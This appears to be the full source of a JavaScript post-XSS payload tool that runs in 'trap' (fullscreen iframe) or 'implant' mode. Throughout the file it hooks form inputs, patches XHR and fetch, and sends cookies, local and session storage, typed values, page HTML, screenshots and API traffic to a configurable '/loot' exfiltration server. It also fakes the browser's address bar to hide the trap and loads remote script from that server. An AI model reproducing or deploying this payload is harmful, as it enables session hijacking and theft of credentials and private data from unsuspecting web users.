//alert('Ready to launch trap?');





// *******************************************************************************

function initGlobals()
{
	console.log("Initializing globals...");

	// Set to trap for iFrame trap, where
	// the payload needs to try to keep it's
	// own persistence. 
	// Set to implant for assume persistence
	// like adding directly to the javascript
	// on the application server. 
	// Setting: trap or implant
	window.taperMode = "implant";


	if (window.taperMode === "trap")
	{
		// Ue fullscreen for actual prod usage
		// not fullscreen shows the XSS laden landing

		// page in the background so you can 
		// tell if you're still where you need to be during
		// development. 
		window.taperfullscreenIframe = true; // Set to true for production use, false for dev
		// Whether or not to copy screenshots to background
		// Can make transitions smoother. Sometimes the
		// background page of the iFrame trap flashes through
		// when navigating the app. This hides that a bit
		// by copying the image to the background
		window.tapersetBackgroundImage = false;

		// What page in the application to start users in
		// Note that if the trap is loading from
		// a reload, it hopefully will automatically
		// load the page the user was on in the iframe
		// when they reloaded the page. Otherwise,
		// they'll start here
		//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
		window.taperstartingPage = "https://127.0.0.1:8443/";
	}





	// Exfil server
	window.taperexfilServer = "https://127.0.0.1:8444";

	// Should we exfil the entire HTML code?
	window.taperexfilHTML = true;

	

	// Should we try to monkey patch underlying API prototypes?
	window.monkeyPatchAPIs = true;


	// Should we capture a screenshot after a delay after an API call?
	// The data that came back from the API call might have been used to update
	// the UI
	window.postApiCallScreenshot = true;
	window.screenshotDelay       = 2000;


	// Create our own XHR that won't get modified by monkeyPatching
	window.taperXHR = XMLHttpRequest;




	// Helpful variables
	// window.taperlastFakeUrl = "";

	sessionStorage.setItem('taperLastUrl', '');


	// Slow down the html2canvas
	window.taperloaded = false;


	// Client UUID
	sessionStorage.setItem('taperSessionUUID', '');
	// window.taperSessionUUID = "";

	// Cookie storage
	// window.tapercookieStorageDict = {};
	sessionStorage.setItem('taperCookieStorage', '');


	// Local storage
	// window.taperlocalStorageDict = {};
	sessionStorage.setItem('taperLocalStorage', '');


	// Session storage
	// window.tapersessionStorageDict = {};
	sessionStorage.setItem('taperSessionStorage', '');

}




function canAccessIframe(iframe) {
	try {
		console.log("Trying to access iframe contentDocument...");
		var retValue = Boolean(iframe.contentDocument);

		console.log("Return value would be: " + retValue);
		return Boolean(iframe.contentDocument);
	}
	catch(e){
		console.log("canAccessIframe returning false...");
		return false;
	}
}



// Snag a screenshot and ship it
function sendScreenshot()
{
	if (taperloaded == false)
	{
		console.log("!!! Waiting 3 seconds to init html2canvas!");
		setTimeout(function () {}, 3000);
		taperloaded = true;
	}
	// console.log("---Snagging screenshot...");

	var myReferences = "";

	if (window.taperMode === "trap")
	{
		myReference = document.getElementById('iframe_a');
	}
	else
	{
		myReference = document;
	}

	// html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
	html2canvas(myReference.contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
	{
		function responseHandler() 
		{
			console.log(this.responseText)
		};

		//console.log("About to send image....");
		// request = new XMLHttpRequest();
		request = new window.taperXHR();
		request.addEventListener("load", responseHandler);
		request.open("POST", taperexfilServer + "/loot/screenshot/" + 
			sessionStorage.getItem('taperSessionUUID'));


		// Helps hide flashing of the page when clicking around
		if (tapersetBackgroundImage)
		{
			document.body.style.backgroundImage = 'url('+canvas.toDataURL("image/png")+')';
			document.body.style.backgroundRepeat = "no-repeat";
			document.body.style.backgroundSize = "auto";
		}


		canvas.toBlob((blob) => 
		{
			const image = blob;
			request.send(image);
		});
	}).catch(e => console.log(e));
}





// Hook all the inputs so we can capture what was typed
// Called a lot to make sure we don't miss some input
// Code checks (attributes) makes sure we don't register 
// events multiple times
function hookInputs()
{
	var myReference = "";

	if (window.taperMode === "trap")
	{
		myReference = document.getElementById("iframe_a");
	}
	else
	{
		myReference = document;
	}

	// inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
	inputs = myReference.contentDocument.getElementsByTagName('input');
	for (index = 0; index < inputs.length; index++)
	{
		// Check to see if we've already hooked the input field. 
		// We can just use our own custom attribute to track, if it's
		// already hooked then skip it. If that attribute is missing, something happened
		// like a page change, but maybe the actual URL didn't change. 
		if (inputs[index].getAttribute("tappedState") != "true")
		{
			//console.log("!! Setting tappedState attribute on element index: " + index);
			inputs[index].setAttribute("tappedState", "true");

			// Adding event listeners to fire when the value in submitted 
			addEventListener(inputs[index], (event) => updateInput);
			inputs[index].addEventListener("change", function(){
				inputName = this.name;
				inputValue = this.value;
				// request = new XMLHttpRequest();
				request = new window.taperXHR();
				request.open("POST", taperexfilServer + "/loot/input/" + 
						sessionStorage.getItem('taperSessionUUID'));
				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
				var jsonObj = new Object();
				jsonObj["inputName"] = inputName;
				jsonObj["inputValue"] = inputValue;
				var jsonString = JSON.stringify(jsonObj);
				request.send(jsonString);
			});
		}
	}
}



// Check for cookies, see if values
// have been added or changed
// Only update backend if new cookie or value changed.
function checkCookies()
{
	cookieArray = document.cookie.split(';');
	for (index = 0; index < cookieArray.length; index++)
	{
		// console.log("++ Cookie loop: " + index);
		cookieData = cookieArray[index].split('=');
		// console.log("cookieName: " + cookieData[0]);
		// console.log("cookieValue: " + cookieData[1]);

		cookieName = cookieData[0];
		cookieValue = cookieData[1];

		if (cookieName.length === 0)
		{
			continue;
		}

		if (cookieValue.length === 0)
		{
			continue;
		}



		var cookieDict = {};
		if (sessionStorage.getItem('taperCookieStorage').length > 0)
		{
			cookieDict = JSON.parse(sessionStorage.getItem('taperCookieStorage'));

			if (cookieName in cookieDict)
			{
				// console.log("== Existing cookie: " + cookieName);
				if (cookieDict[cookieName] != cookieValue)
				{
					// Existing cookie, but the value has changed
					// console.log("     New cookie value: " + cookieValue);
					// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
					cookieDict[cookieName] = cookieValue;
				}
				else
				{
					// Existing cookie, but no change in value to report
					// console.log("     Cookie value unchanged");
					continue;
				}
			}
		}

		cookieDict[cookieName] = cookieValue;

		if (Object.keys(cookieDict).length > 0)
		{
			sessionStorage.setItem('taperCookieStorage', JSON.stringify(cookieDict));
		}


		// Ship it
		// request = new XMLHttpRequest();
		request = new window.taperXHR();
		request.open("POST", taperexfilServer + "/loot/dessert/" + 
				sessionStorage.getItem('taperSessionUUID'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["cookieName"] = cookieName;
		jsonObj["cookieValue"] = cookieValue;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}


// Check for local storage data, see if values
// have been added or changed
// Only update backend if new data or value changed.
function checkLocalStorage()
{
	for (index = 0; index < localStorage.length; index++)
	{
		key   = localStorage.key(index)
		value = localStorage.getItem(key)
		//console.log("~~~ Local storage: {" + key + ", " + value + "}");


		var localStorageDict = {};

		if (sessionStorage.getItem('taperLocalStorage').length > 0)
		{
			localStorageDict = JSON.parse(sessionStorage.getItem('taperLocalStorage'));

			if (key in localStorageDict)
			{
				// Existing local storage key
				//console.log("!!! Existing localstorage key...");
				if (localStorageDict[key] != value)
				{
					// Existing localStorage, but the value has changed
					// console.log("     New localStorage value: " + value);
					// console.log("     Old localStorage value: " + localStorageDict[key]);
					localStorageDict[key] = value;
				}
				else
				{
					// Existing cookie, but no change in value to report
					//console.log("     localStorgae value unchanged");
					continue;
				}
			}
		}

		// New localStorage entry
		//console.log("++ New localStorage: " + key + ", with value: " + value);
		localStorageDict[key] = value;

		// Copy dictionary back to session storage
		if (Object.keys(localStorageDict).length > 0)
		{
			sessionStorage.setItem('taperLocalStorage', JSON.stringify(localStorageDict));
		}


		// Ship it
		// request = new XMLHttpRequest();
		request = new window.taperXHR();
		request.open("POST", taperexfilServer + "/loot/localstore/" + 
				sessionStorage.getItem('taperSessionUUID'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["key"] = key;
		jsonObj["value"] = value;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}



// Check for session storage data, see if values
// have been added or changed
// Only update backend if new data or value changed.
function checkSessionStorage()
{
	console.log("!!! Top of checkSessionStorage...");
	for (index = 0; index < sessionStorage.length; index++)
	{
		key = sessionStorage.key(index)
		value = sessionStorage.getItem(key)
		console.log("~~~ Session storage: {" + key + ", " + value + "}");


		if (key === "taperSessionStorage" || 
			key === "taperLocalStorage" || 
			key === "taperCookieStorage"||
			key === "taperSessionName" ||
			key === "taperLastUrl" ||
			key === "taperSystemLoaded" ||
			key === "taperSessionUUID")
		{
			// Should skip over our own session storage for reporting
			console.log("!!! Found taper data in session storage, hopefully SKIPPING");
			continue;
		}


		var sessionStorageDict = {};

		if (sessionStorage.getItem('taperSessionStorage').length > 0)
		{
			console.log("+++ taperSessionStorage has length...");
			sessionStorageDict = JSON.parse(sessionStorage.getItem('taperSessionStorage'));

			if (key in sessionStorageDict)
			{
				// Existing local storage key
				console.log("!!! Existing sessionstorage key...");
				if (sessionStorageDict[key] != value)
				{
					// Existing localStorage, but the value has changed
				 	console.log("     New sessionStorage value: " + value);
				 	console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
					sessionStorageDict[key] = value;
				}
				else
				{
					// Existing sessionStorage, but no change in value to report
					console.log("     sessionStorage value unchanged");
					continue;
				}
			}
		}
		else
		{
			console.log("+++ In else statement for taperSessionStorage length check...");
		}

		console.log("XXXX Wrapping up Session storage: {" + key + ", " + value + "}");

		sessionStorageDict[key] = value;

		console.log("!!!! About to set session storage value to: " + JSON.stringify(sessionStorageDict))
		console.log("Length of dict is: " + sessionStorageDict.length);
		if (Object.keys(sessionStorageDict).length > 0)
		{
			sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
		}


		// Ship it
		// request = new XMLHttpRequest();
		request = new window.taperXHR();
		request.open("POST", taperexfilServer + "/loot/sessionstore/" + 
				sessionStorage.getItem('taperSessionUUID'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["key"] = key;
		jsonObj["value"] = value;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}



// Optional, copy the entire HTML and send out
function sendHTML()
{
	var myReference = "";

	if (window.taperMode === "trap")
	{
		myReference = document.getElementById("iframe_a");
	}
	else
	{
		myReference = document;
	}

	trapURL  = myReference.contentDocument.location.href;
	trapHTML = myReference.contentDocument.documentElement.outerHTML;

	// request = new XMLHttpRequest();
	request = new window.taperXHR();
	request.open("POST", taperexfilServer + "/loot/html/" + 
			sessionStorage.getItem('taperSessionUUID'));
	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
	var jsonObj = new Object();
	jsonObj["url"] = trapURL;
	jsonObj["html"] = trapHTML;
	var jsonString = JSON.stringify(jsonObj);
	request.send(jsonString);
}



// Function to hold loot stealing acalls
function captureUrlChangeLoot()
{
	// Handle input scraping
	hookInputs();

	// Handle screenshotting
	sendScreenshot();


	// Exfil HTML code
	if (taperexfilHTML)
	{
		sendHTML();
	}
}





// When this update fires, it checks the iframe trap URL
// where the user thinks they are, then does a lot of things
// Steals inputs, URL, screenshots, etc. 
// Also updates their browser address bar so they 
// think they're on the page they're viewing in the
// iframe trap, not the one with the XSS vuln. 
function runUpdate()
{
	var currentUrl = "";
	var fullUrl = "";

	if (window.taperMode === "trap")
	{
		// iFrame trap mode
		// iFrame trap disable code
		if (!canAccessIframe(document.getElementById("iframe_a")))
		{
			// If we can't access the iframe anymore, that 
			// means the iframe has changed origin. They 
			// surfed away to a new domain, probably through a link
			// 
			// This is bad, the new page won't load in the iframe trap
			// and will throw very obvious errors on their page
			// indicating something isn't right  
			//
			// Safest thing is the kill the iframe trap and hope
			// no one notices. We'll reload the parent page to the current 
			// iframe page. It'll seem like clicking the link to the 
			// external page didn't work, but the second click will. 
			// First click exits the iframe, reloads the normally. 
			// Second click will properly load the external page. 
			// Sad to lose the trap through. 
			console.log("iFrame access lost, loading page: " + sessionStorage.getItem('taperLastUrl'));
			window.location = sessionStorage.getItem('taperLastUrl');
		}
		else
		{
			console.log("Looks like canAccessIframe check passed!");
		}

		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
		fullUrl    = document.getElementById("iframe_a").contentDocument.location.href;
	}
	else
	{
		currentUrl = document.location.pathname;
		fullUrl    = document.location.href;		
	}


	// Let's see if the URL has changed
	if (sessionStorage.getItem('taperLastUrl') != currentUrl)
	{
		// Handle URL recording
		console.log("New trap URL, stealing the things: " + fullUrl);
		sessionStorage.setItem('taperLastUrl', currentUrl);


				// This needs an API call to report the new page
		// and take a screenshot maybe, not sure if
		// screenshot timing will be right yet
		// request = new XMLHttpRequest();
		request = new window.taperXHR();
		request.open("POST", taperexfilServer + "/loot/location/" + 
				sessionStorage.getItem('taperSessionUUID'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		
		var jsonObj = new Object();
		jsonObj["url"] = fullUrl;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);


		// We need to wait until the iframe/page has loaded to
		// do HTML based looting. 
		if (window.taperMode === "trap")
		{
			document.getElementById("iframe_a").onload = function() {
				// console.log("+++ Onload ready!");

				// Fake the URL that the user sees. 
				// This is important for iFrame trap mode. 
				window.history.replaceState(null, '', currentUrl);

				captureUrlChangeLoot();
			}
		}
		else
		{
			document.onload = function() {
				captureUrlChangeLoot();
			}
		}
	}


	// Updates that need to happen constantly
	// hooking inputs, we can miss them otherwise
	// hookInputs intelligently knows whether inputs
	// need to be rehooked or not
	hookInputs();


	// Handle Cookies
	// Will only report when new cookies found, or values change. 
	checkCookies();


	// Check local storage
	// Will only report when new or changed data found
	checkLocalStorage();


	// Check session storage
	// Will only report when new or changed data found
	checkSessionStorage();

	if (window.taperMode === "trap")
	{
		// Fake the URL that the user sees. This is important. 
		window.history.replaceState(null, '', currentUrl);
	}
}





// Fetch API wrapper for monkey patching
function customFetch(url, options)
{
	// console.log("** Cloned Fetch API call**");
	// console.log("Fetch url: " + url);
	// console.log("Fetch method: " + options.method);
	// console.log("Fetch headers: " + JSON.stringify(options.headers));
	// console.log("Fetch body: " + options.body);

	// send setup loot
	// request = new XMLHttpRequest();
	request = new window.taperXHR();
	request.open("POST", taperexfilServer + "/loot/fetchSetup/" + 
			sessionStorage.getItem('taperSessionUUID'));
	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

	var jsonObj = new Object();
	jsonObj["method"] = options.method;
	jsonObj["url"]    = url;
	var jsonString    = JSON.stringify(jsonObj);
	request.send(jsonString);

	for (const key in options.headers)
	{
		const value = options.headers[key];
		// console.log("**** " + key, value);

		// send header loot
		// request = new XMLHttpRequest();
		request = new window.taperXHR();
		request.open("POST", taperexfilServer + "/loot/fetchHeader/" + 
				sessionStorage.getItem('taperSessionUUID'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

		var jsonObj = new Object();
		jsonObj["header"] = key;
		jsonObj["value"]  = value;
		var jsonString    = JSON.stringify(jsonObj);
		request.send(jsonString);
	}

	// Let's get the API call good stuff
	const requestBody = options.body;


	// Clone request
	return fetch(url, options).then((response) => {
		// clone response
		return response.clone().text().then((body) => {
			// console.log('Response Status:', response.status);
			// console.log('Response Headers:', response.headers);
			// console.log('Response Body:', body);


			// send API call body loot
			// request = new XMLHttpRequest();
			request = new window.taperXHR();
			request.open("POST", taperexfilServer + "/loot/fetchCall/" + 
					sessionStorage.getItem('taperSessionUUID'));
			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

			var jsonObj = new Object();
			jsonObj["requestBody"]  = btoa(requestBody);
			jsonObj["responseBody"] = btoa(body);
			var jsonString          = JSON.stringify(jsonObj);
			request.send(jsonString);

			// Check if we should take a screenshot now
			if (window.postApiCallScreenshot)
			{
				setTimeout(sendScreenshot, window.screenshotDelay);
			}


			// Continue on like nothing is amiss
			return response;
		});
	})
	.catch((error) => {
		console.error('Error:', error);
		throw error;
	});
}



// Monkey patch API prototypes to intercept API calls
function monkeyPatch()
{
	// console.log("** Enabling API monkey patches...");

	// XHR Part
	const xhrOriginalOpen      = window.XMLHttpRequest.prototype.open;
	const xhrOriginalSetHeader = window.XMLHttpRequest.prototype.setRequestHeader;
	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;


	var myReference = "";

	if (window.taperMode === "trap")
	{
		// myReference = document.getElementById("iframe_a");
		myReference = document.getElementById("iframe_a").contentWindow.XMLHttpRequest;
	}
	else
	{
		myReference = XMLHttpRequest;;
	}


	//Monkey patch open
	// myReference.contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
	myReference.prototype.open = function(method, url, async, user, password) 
	{
		var method = arguments[0];
		var url = arguments[1];

		console.log("Intercepted XHR open: " + method + ", " + url);


		// send loot
		// request = new XMLHttpRequest();
		request = new window.taperXHR();
		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + 
				sessionStorage.getItem('taperSessionUUID'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

		var jsonObj = new Object();
		jsonObj["method"] = method;
		jsonObj["url"]    = url;
		var jsonString    = JSON.stringify(jsonObj);
		request.send(jsonString);


		xhrOriginalOpen.apply(this, arguments);
	}



	// Monkey patch setRequestHeader
	myReference.prototype.setRequestHeader = function (header, value)
	{
		var header = arguments[0];
		var value  = arguments[1];

		// console.log("$$$ MonekeyURL: " + this.url);

		console.log("Intercepted Header = " + header + ": " + value);


		// request = new XMLHttpRequest();
		request = new window.taperXHR();
		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + 
				sessionStorage.getItem('taperSessionUUID'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

		var jsonObj = new Object();
		jsonObj["header"] = header;
		jsonObj["value"]  = value;
		var jsonString    = JSON.stringify(jsonObj);
		request.send(jsonString);


		xhrOriginalSetHeader.apply(this, arguments);
	}


  	// Monkey patch send
	myReference.prototype.send = function(data) 
	{
		console.log("Intercepted request body: " + data);

		var requestBody = btoa(data);


		this.onreadystatechange = function()
		{
			if (this.readyState === 4)
			{
				var data;

				if (!this.responseType || this.responseType === "text") 
				{
					data = this.responseText;
				} 
				else if (this.responseType === "document") 
				{
					data = this.responseXML;
				} 
				else if (this.responseType === "json") 
				{
					data = JSON.stringify(this.response);
				} 
				else 
				{
					data = xhr.response;
				}

				var responseBody = btoa(data);
				// var response = read_body(this);
				console.log("Intercepted response: " + data);

				// request = new XMLHttpRequest();
				request = new window.taperXHR();
				request.open("POST", taperexfilServer + "/loot/xhrCall/" + 
						sessionStorage.getItem('taperSessionUUID'));
				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

				var jsonObj = new Object();
				jsonObj["requestBody"]  = requestBody;
				jsonObj["responseBody"] = responseBody;
				var jsonString          = JSON.stringify(jsonObj);
				request.send(jsonString);

				// Check if we should take a screenshot now
				if (window.postApiCallScreenshot)
				{
					setTimeout(sendScreenshot, window.screenshotDelay);
				}
			}
		};

		xhrOriginalSend.apply(this, arguments);
	}


	// console.log("## Starting fetch monkey patching");
	// Fetch API monkey patching
	const originalFetch = window.fetch;
	myReference.contentWindow.fetch = customFetch;
}




// Start the tap
function takeOver()
{
	var myReference = "";

	if (window.taperMode === "trap")
	{
		console.log("Starting iFrame Trap");

		// Setup our iframe trap
		var iframe = document.createElement("iframe");
		iframe.setAttribute("src", taperstartingPage);
		iframe.setAttribute("style", "border:none");

		if (taperfullscreenIframe)
		{
			console.log("&& Using fullscreen");
			iframe.style.width  = "100%";
			iframe.style.height = "100%";
			iframe.style.top = "0px";
			iframe.style.left = "0px"
		}
		else
		{
			console.log("&& Using partial screen");
			iframe.style.width  = "80%";
			iframe.style.height = "80%";
			iframe.style.top = "50px";
			iframe.style.left = "50px";
		}
		iframe.style.position = "fixed";
		iframe.id = "iframe_a";
		document.body.appendChild(iframe);

		// Just register all the darned events, each event in the iframe
		// we'll call runUpdate()
		var myReference = document.getElementById('iframe_a');


	}
	else
	{
		console.log("Starting implant mode!");
		myReference = document.contentDocument;
	}

	// Hook all the things
	for(var key in myReference){
		if(key.search('on') === 0) {
			myReference.addEventListener(key.slice(2), runUpdate);
		}
	}		

	// Monkey patch underlaying API calls?
	if (window.monkeyPatchAPIs)
	{
		monkeyPatch();
	}
}





// ********************************************
// Go time



if (sessionStorage.getItem('taperSystemLoaded') != "true")
{
	sessionStorage.setItem("taperSystemLoaded","true");
	initGlobals();


	// Get our client UUID
	// request = new XMLHttpRequest();
	request = new window.taperXHR();
	request.open("GET", window.taperexfilServer + "/client/getToken", true);
	request.send(null);

	request.onreadystatechange = function()
	{
		if (request.readyState == XMLHttpRequest.DONE)
		{
			if (request.status == 200)
			{

				// We have a session, start taking over

				if (window.taperMode === "trap")
				{
					// Blank main page
					document.body.innerHTML = "";
					document.body.outerHTML = "";
				}

				// Pull in html2canvas
				var js = document.createElement("script");
				js.type = "text/javascript";
				js.src = taperexfilServer + "/lib/telemhelperlib.js";


				this.temp_define = window['define'];
				document.body.appendChild(js);
				window['define'] = undefined;
				console.log("HTML2CANVAS added to DOM");



				var jsonResponse = JSON.parse(request.responseText);
				//window.taperSessionUUID = jsonResponse.clientToken;
				sessionStorage.setItem('taperSessionUUID', jsonResponse.clientToken);


    			// We're ready to trap all the things now
				takeOver();
			}
			else
			{
				console.log("No client session received, skipping");
			}
		}
	}
}
else
{
	console.log("++++++ Already loaded payload!");
}



